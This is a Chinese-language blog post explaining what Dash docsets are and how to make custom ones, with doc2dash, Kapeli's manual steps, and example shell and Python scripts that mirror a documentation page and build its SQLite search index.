<h2 id="1-2-什么是docset"><a href="#1-2-什么是docset" class="headerlink" title="1.2. 什么是docset"></a>1.2. 什么是docset</h2><p><a href="https://kapeli.com/dash_guide">https://kapeli.com/dash_guide</a><br>Documentation sets, or docsets, consist of collections of HTML files. Dash uses these docsets to store the docs you need. This section describes the various features Dash has to help you acquire and manange docsets.<br><a href="https://fileinfo.com/extension/docset">https://fileinfo.com/extension/docset</a><br>What is a DOCSET file?<br>Developer file created by Doxygen, a source code documentation system; contains an archive of documentation about a body of source code, which can encompass many different individual source code files and code constructs; used as the storage format for publishing documentation to developers that use the source code.</p>
<h2 id="1-3-哪里可以下载docset"><a href="#1-3-哪里可以下载docset" class="headerlink" title="1.3. 哪里可以下载docset"></a>1.3. 哪里可以下载docset</h2><p>dash.app 可以直接下<br>Docsets can be downloaded Dash’s Preferences &gt; Downloads.</p>
<h2 id="1-4-为什么要自己生成docset"><a href="#1-4-为什么要自己生成docset" class="headerlink" title="1.4. 为什么要自己生成docset"></a>1.4. 为什么要自己生成docset</h2><p>想定制一些自己查询的文档，这些文档没有别人做好的docset可以下，能找到一些html,但如果每次都查询html又觉得麻烦，所以有了自定义docset的想法。</p>
<h2 id="1-5-哪里软件支持docset"><a href="#1-5-哪里软件支持docset" class="headerlink" title="1.5. 哪里软件支持docset"></a>1.5. 哪里软件支持docset</h2><h3 id="1-5-1-dash"><a href="#1-5-1-dash" class="headerlink" title="1.5.1. dash"></a>1.5.1. dash</h3><p>作为一名程序员，最离不开的就是文档了，大多数情况下我们都是通过文档了解一个陌生的领域。想象一下，打开了一堆文档，在文档中跳来跳去，多么的不优雅！所以Bogdan Popescu一怒之下开发了dash，解放了太多在文档中跳来跳去的码农。<br>自带大量常用文档(iOS&#x2F;Mac&#x2F;PHP&#x2F;Python&#x2F;Java等)<br>支持用户自定义文档(scrapy&#x2F;requests&#x2F;beautifulsoup等)<br>快速搜索文档及 API<br>管理和搜索代码片段<br>无缝插入众多第三方应用(Alfred&#x2F;Xcode&#x2F;Terminal等)<br><img src="/./pic/73436.png" alt="73436.png"></p>
<h3 id="1-5-2-类似dash的工具"><a href="#1-5-2-类似dash的工具" class="headerlink" title="1.5.2. 类似dash的工具"></a>1.5.2. 类似dash的工具</h3><p><a href="https://doc2dash.readthedocs.io/en/latest/installation.html#viewer">https://doc2dash.readthedocs.io/en/latest/installation.html#viewer</a><br>To view the results, you will need a docset viewer, the most commonly known being Dash.app for macOS.<br>Other alternatives have been developed in cooperation with Dash.app’s developer Kapeli:<br>helm-dash for Emacs,<br>velocity for Windows,<br>and zeal for Linux, macOS, and Windows.</p>
<h3 id="1-5-3-官方工具支持自定义docset"><a href="#1-5-3-官方工具支持自定义docset" class="headerlink" title="1.5.3. 官方工具支持自定义docset"></a>1.5.3. 官方工具支持自定义docset</h3><h4 id="1-5-3-1-doc2dash"><a href="#1-5-3-1-doc2dash" class="headerlink" title="1.5.3.1. doc2dash"></a>1.5.3.1. doc2dash</h4><p>Instructions on generating docsets can be found in the Docset Generation Guide.<br>doc2dash is an MIT-licensed extensible Documentation Set generator intended to be used with the Dash.app API browser for macOS or one of its many free clones for all relevant platforms.<br>If you’ve never heard of Dash.app and its likes, you’re missing out: together with doc2dash it’s all your API documentation at your fingertips – even when you’re offline!<br>doc2dash’s documentation lives at Read the Docs, the code on GitHub. It’s tested on Python 2.7, 3.4+, and PyPy. Both Linux and macOS are tested although certain features are only available on macOS.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd docs &amp;&amp; make html</span><br><span class="line">doc2dash html</span><br></pre></td></tr></table></figure>
<p>一些项目有规范的doc文档，可以用doc2dash 来生成docset.</p>
<h4 id="1-5-3-2-dash-docset-builder"><a href="#1-5-3-2-dash-docset-builder" class="headerlink" title="1.5.3.2. dash-docset-builder"></a>1.5.3.2. dash-docset-builder</h4><p>php写的，功能还是很全，但是不太会调<br><a href="https://github.com/godbout/dash-docset-builder">https://github.com/godbout/dash-docset-builder</a></p>
<h3 id="1-5-4-官方手动方法自定义docset"><a href="#1-5-4-官方手动方法自定义docset" class="headerlink" title="1.5.4. 官方手动方法自定义docset"></a>1.5.4. 官方手动方法自定义docset</h3><p><a href="https://kapeli.com/docsets#copyDocumentation">https://kapeli.com/docsets#copyDocumentation</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.1. Create the Docset Folder#</span><br><span class="line">The docset folder structure can be created using this Terminal command:</span><br><span class="line"></span><br><span class="line">mkdir -p &lt;docset name&gt;.docset/Contents/Resources/Documents/</span><br><span class="line">You can also manually create the docset structure if you want, they&#x27;re just folders.</span><br><span class="line"></span><br><span class="line">13.2. Copy the HTML Documentation#</span><br><span class="line">Copy the HTML documentation you already have to this folder:</span><br><span class="line"></span><br><span class="line">&lt;docset name&gt;.docset/Contents/Resources/Documents/</span><br><span class="line">13.3. Create the Info.plist File#</span><br><span class="line">Download and edit this sample Info.plist and place it in the &lt;docset name&gt;.docset/Contents/ folder. Editing should be straightforward, just set the values to whatever name you want for your docset.</span><br><span class="line"></span><br><span class="line">13.4. Create the SQLite Index#</span><br><span class="line">Create a SQLite database in the file &lt;docset name&gt;.docset/Contents/Resources/docSet.dsidx with the following query:</span><br><span class="line"></span><br><span class="line">CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line">Recommended: you can easily prevent adding duplicate entries to the index by also using this query:</span><br><span class="line"></span><br><span class="line">CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);</span><br><span class="line">13.5. Populate the SQLite Index#</span><br><span class="line">You need to create a script (or application or whatever) that will go through your HTML documentation and add appropriate rows into the SQLite database. Rows can be added using this query:</span><br><span class="line"></span><br><span class="line">INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#x27;name&#x27;, &#x27;type&#x27;, &#x27;path&#x27;);</span><br><span class="line">The values are:</span><br><span class="line"></span><br><span class="line">name is the name of the entry. For example, if you are adding a class, it would be the name of the class. This is the column that Dash searches.</span><br><span class="line">type is the type of the entry. For example, if you are adding a class, it would be &quot;Class&quot;. For a list of types that Dash recognises, see below.</span><br><span class="line">path is the relative path towards the documentation file you want Dash to display for this entry. It can contain an anchor (#). Alternatively, Dash also supports http:// URL entries.</span><br><span class="line"></span><br><span class="line">You can find a few generation script examples here.</span><br><span class="line">[https://kapeli.com/docsets#scriptExamples](https://kapeli.com/docsets#scriptExamples)</span><br></pre></td></tr></table></figure>
<h3 id="1-5-5-自定义生成docset"><a href="#1-5-5-自定义生成docset" class="headerlink" title="1.5.5. 自定义生成docset"></a>1.5.5. 自定义生成docset</h3><p>因为别的方法无法具体实现想指定的dash xxx 搜索指令，不能很方便的扩展搜索方式，自己实现可以实现任意html生成dash 的方式</p>
<h4 id="1-5-5-1-获取htm-并生成docset"><a href="#1-5-5-1-获取htm-并生成docset" class="headerlink" title="1.5.5.1. 获取htm,并生成docset"></a>1.5.5.1. 获取htm,并生成docset</h4><p>使用dash 代码片段生成得到指定网页的html,并生成docset格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">wget --recursive \</span><br><span class="line">  --html-extension \</span><br><span class="line">  --convert-links \</span><br><span class="line">  --domains ~_~lldb.llvm.org~_~ \</span><br><span class="line">  --restrict-file-names=windows \</span><br><span class="line">  --page-requisites \</span><br><span class="line">  --reject pdf \</span><br><span class="line">  --no-parent ~_~lldb.llvm.org~_~/~_~arm~_~.html</span><br><span class="line"></span><br><span class="line">if [ -d &quot;~_~arm~_~.docset&quot; ]; then</span><br><span class="line">    echo &quot;~_~arm~_~.docset exitst, please delete it&quot;</span><br><span class="line">    return</span><br><span class="line">fi</span><br><span class="line">contents=~_~arm~_~.docset/Contents</span><br><span class="line">res=$contents/Resources</span><br><span class="line">doc=$res/Documents</span><br><span class="line">mkdir -p $doc</span><br><span class="line">cp frida.png ~_~arm~_~.docset/icon.png</span><br><span class="line">mv ~_~arm~_~.html $doc</span><br><span class="line"></span><br><span class="line">rm $res/docSet.dsidx</span><br><span class="line"></span><br><span class="line">cat &gt; $contents/Info.plist &lt;&lt;- &quot;EOF&quot;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">  &lt;key&gt;CFBundleIdentifier&lt;/key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;/string&gt;</span><br><span class="line">  &lt;key&gt;CFBundleName&lt;/key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;/string&gt;</span><br><span class="line">  &lt;key&gt;DocSetPlatformFamily&lt;/key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~&lt;/string&gt;</span><br><span class="line">  &lt;key&gt;dashIndexFilePath&lt;/key&gt;</span><br><span class="line">  &lt;string&gt;~_~arm~_~.html&lt;/string&gt;</span><br><span class="line">  &lt;key&gt;isDashDocset&lt;/key&gt;</span><br><span class="line">  &lt;true/&gt;</span><br><span class="line">&lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br><span class="line">EOF</span><br><span class="line">echo &#x27;done&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="1-5-5-2-创建索引"><a href="#1-5-5-2-创建索引" class="headerlink" title="1.5.5.2. 创建索引"></a>1.5.5.2. 创建索引</h4><p>如以下代码创建了 radare2 这个工具的html的docset<br><img src="/./pic/355453.png" alt="355453.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">from pathlib import Path</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line"># CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);</span><br><span class="line"># INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#x27;Exploit&#x27;, &#x27;Class&#x27;, &#x27;index.html&#x27;);</span><br><span class="line">respath=&quot;~_~arm~_~.docset/Contents/Resources&quot;</span><br><span class="line">conn = sqlite3.connect(&#x27;&#123;&#125;/docSet.dsidx&#x27;.format(respath))</span><br><span class="line">conn.executescript(&#x27;&#x27;&#x27;</span><br><span class="line">    CREATE TABLE IF NOT EXISTS searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);</span><br><span class="line">    CREATE UNIQUE INDEX IF NOT EXISTS anchor ON searchIndex (name, type, path);&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">def insert(*args):</span><br><span class="line">    conn.execute(&#x27;&#x27;&#x27;INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (?, ?, ?);&#x27;&#x27;&#x27;, args)</span><br><span class="line"></span><br><span class="line">filename=&quot;&#123;&#125;/Documents/~_~arm~_~.html&quot;.format(respath)</span><br><span class="line">with open(filename) as fp:</span><br><span class="line">    html = fp.read()</span><br><span class="line">print(&quot;filename=&#123;&#125;&quot;.format(filename))</span><br><span class="line">soup = BeautifulSoup(html)</span><br><span class="line"></span><br><span class="line">relpath = str(Path(filename).relative_to(&quot;&#123;&#125;/Documents&quot;.format(respath)))</span><br><span class="line"></span><br><span class="line"># Rax2 1.12.1</span><br><span class="line"># Rafind2 1.12.2</span><br><span class="line"># Rarun2 1.12.3</span><br><span class="line"># Rabin2 1.12.4</span><br><span class="line"># Radiff2 1.12.5</span><br><span class="line"># Rasm2 1.12.6</span><br><span class="line"># Ragg2 1.12.7</span><br><span class="line"># Rahash2 1.12.8</span><br><span class="line"></span><br><span class="line">type = &quot;Method&quot;</span><br><span class="line"></span><br><span class="line">for subtitle in soup.select(&quot;a&quot;):</span><br><span class="line">    if not subtitle:</span><br><span class="line">        break</span><br><span class="line">    if subtitle == &quot;\n&quot;:</span><br><span class="line">        continue</span><br><span class="line">    if subtitle.text != &quot;Rax2&quot; and subtitle.text != &quot;Rafind2&quot; and subtitle.text != &quot;Rarun2&quot; \</span><br><span class="line">            and subtitle.text != &quot;Rabin2&quot; and subtitle.text != &quot;Radiff2&quot; and subtitle.text != &quot;Rasm2&quot;\</span><br><span class="line">            and subtitle.text != &quot;Ragg2&quot; and subtitle.text != &quot;Rahash2&quot;:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    name = subtitle.text</span><br><span class="line">    # path=&#x27;%s#%s&#x27; % (relpath, name)</span><br><span class="line">    path=&quot;&#123;&#125;&#123;&#125;&quot;.format(relpath,subtitle[&quot;href&quot;].lower())</span><br><span class="line">    print(&quot;&#123;&#125;\t\t&#123;&#125;\t\t&#123;&#125;&quot;.format(name,type,path))</span><br><span class="line">    insert(name, type, path)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<h2 id="1-6-总结"><a href="#1-6-总结" class="headerlink" title="1.6. 总结"></a>1.6. 总结</h2><p>1.遇到问题多看官网，官网有解决办法，不用你老人家瞎琢磨耽误时间<br>2.看文档细心。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>dash</category>
      </categories>
      <tags>
        <tag>docset</tag>
        <tag>dash</tag>
      </tags>
  </entry>
</search>
